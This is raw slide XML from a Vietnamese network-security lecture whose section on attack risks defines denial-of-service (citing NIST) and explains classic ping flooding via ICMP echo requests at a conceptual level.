          <p:cNvPr id="5" name="Diagram 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8017B58B-5B22-4411-B43E-DEC45FD3F777}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3637396106"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1371600"/>
          <a:ext cx="10860157" cy="47275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41570768"/>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IV. NGUY CƠ TẤN CÔNG</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{695CF9CA-525C-490F-BF11-AF1C150B8AB4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1447800" y="1685217"/>
            <a:ext cx="9274579" cy="4081581"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4228632824"/>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7FC67533-50F2-4DF7-820D-A9CE2B0749EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3600"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" sz="3600"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-AU" altLang="en-US" sz="3600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6147" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6FFF6A56-7F12-4A81-88E4-FFC990330D1C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="762000" y="1676400"/>
            <a:ext cx="10668000" cy="4648200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>   </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="Group 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{45C020F6-53CD-438F-878A-F828FFD2C387}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1600200" y="2081700"/>
            <a:ext cx="9220200" cy="1918800"/>
            <a:chOff x="543007" y="1065087"/>
            <a:chExt cx="7313229" cy="1918800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="Rectangle: Rounded Corners 4">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3D54B90D-F7AA-4023-8276-DA5C65EEA1A4}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="543007" y="1065087"/>
              <a:ext cx="7313229" cy="1918800"/>
            </a:xfrm>
            <a:prstGeom prst="roundRect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:style>
            <a:lnRef idx="2">
              <a:schemeClr val="accent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6" name="Rectangle: Rounded Corners 4">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{562EE575-6B48-456F-BEAC-D881169B49F1}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="636675" y="1158755"/>
              <a:ext cx="7125893" cy="1731464"/>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287342" tIns="0" rIns="287342" bIns="0" numCol="1" spcCol="1270" anchor="ctr" anchorCtr="0">
              <a:noAutofit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0" algn="just" defTabSz="1555750">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPct val="35000"/>
                </a:spcAft>
              </a:pPr>
              <a:r>
                <a:rPr lang="vi-VN" sz="2500" b="1"/>
                <a:t>Từ chối dịch vụ (Denial of Service - DoS) là một hành động ngăn chặn hoặc làm suy yếu việc sử dụng mạng, hệ thống, hoặc các ứng dụng mà được cấp quyền bằng cách làm cạn kiệt tài nguyên như bộ xử lý trung tâm (CPU), bộ nhớ, băng thông, và không gian đĩa. </a:t>
              </a:r>
              <a:endParaRPr lang="vi-VN" sz="2500" b="1" kern="1200"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{49EA8247-36A6-482E-985E-6F13C9AFFE7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2757280" y="4167016"/>
            <a:ext cx="6906040" cy="423450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2">
            <a:schemeClr val="accent2">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:lnRef>
          <a:fillRef idx="1">
            <a:schemeClr val="accent2">
              <a:alpha val="90000"/>
              <a:tint val="40000"/>
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:fillRef>
          <a:effectRef idx="0">
            <a:schemeClr val="accent2">
              <a:alpha val="90000"/>
              <a:tint val="40000"/>
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="dk1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:fontRef>
        </p:style>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2200" i="1"/>
              <a:t>(NIST Computer Security Incident Handling Guide)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" i="1"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1003363772"/>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7FC67533-50F2-4DF7-820D-A9CE2B0749EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3600"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" sz="3600"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-AU" altLang="en-US" sz="3600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6147" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6FFF6A56-7F12-4A81-88E4-FFC990330D1C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698500" y="1490133"/>
            <a:ext cx="10668000" cy="4648200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Một dạng tấn công vào tính sẵn sàng của dịch vụ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Phân loại tài nguyên có thể bị tấn công</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="7" name="Diagram 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8A7C4EF0-BE0C-4FAE-93FC-2A9042D48CFC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4121782320"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1460500" y="2743200"/>
          <a:ext cx="9144000" cy="3124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9072567"/>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4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE552A57-6483-4A18-A907-3A425200F5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3580" r="3580" b="9265"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2743200" y="1524000"/>
            <a:ext cx="7181850" cy="5006975"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF">
                    <a:alpha val="70195"/>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9" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E194DD48-5FC4-4A0A-9284-D25F1AE70184}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3600"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" sz="3600"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" sz="3600"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="en-US" sz="3600"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3198700902"/>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1EF4ACA5-167C-4637-96E7-C716BFC12043}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" sz="3600"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ấn công DoS cổ điển</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8195" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6BDBB54C-F7CE-4C27-9D77-FC1A1904F8E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1825625"/>
            <a:ext cx="10896600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tấn công tràn ngập Ping ( Ping Flooding)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="1" indent="-342900">
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t> Mục đích của cuộc tấn công này là làm v</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t>ợt quá khả năng của đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t>ờng mạng tới mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="1" indent="-342900">
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t> Luồng mạng dung l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t>ợng lớn có thể được handle bởi các liên kết mạng băng thông cao trên đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t>ờng truyền, nhưng các gói tin có thể bị loại bỏ khi vào đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t>ờng mạng băng thông thấp h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t>n tới mục tiêu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> drop gói tin  DoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Nguồn gốc của cuộc tấn công được xác định rõ ràng, trừ khi kẻ tấn công sử dụng địa chỉ nguồn giả mạo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Hiệu suất mạng bị ảnh hưởng đáng kể</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1735257147"/>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E608B654-8A59-4658-A929-533DCFBAFE6D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1638300" y="274638"/>
            <a:ext cx="10401300" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" sz="3600"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ấn công DoS cổ điển</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11267" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B22B0075-F525-4C34-BD21-7B4FDA461EB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1416051" y="1752600"/>
            <a:ext cx="8915400" cy="4419600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tấn công tràn ngập Ping ( Ping Flooding)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Internet Control Message Protocol (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1"/>
              <a:t>ICMP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>) là một trong những giao thức IP chính; nó được sử dụng bởi các thiết bị mạng như router, để gửi các thông báo lỗi (ví dụ, một dịch vụ được yêu cầu không có sẵn hoặc một máy chủ hoặc bộ định tuyến không thể liên lạc được)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11268" name="Picture 4" descr="http://www.itgeared.com/images/content/1094-1.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{40100A7C-7211-4E31-A8BA-7D9282D758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6051" y="3789364"/>
            <a:ext cx="5153025" cy="202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9" name="Picture 6" descr="http://www.networkuptime.com/nmap/images/PE_ping.gif">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26012DB6-0486-4177-994F-5D9AFEBB44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43701" y="3767138"/>
            <a:ext cx="3667125"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0" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD5E46FD-7AD6-4504-A722-45320B7ACA21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6611939" y="5100639"/>
            <a:ext cx="443706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algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Host phải đáp ứng tất cả các echo request với một</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>echo reply có chứa các dữ liệu chính xác nhận được trong thông điệp yêu cầu</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4248382904"/>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BE1DF423-12E6-49F9-8B88-49AE9E3CFA83}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" sz="3600"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ấn công DoS cổ điển</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
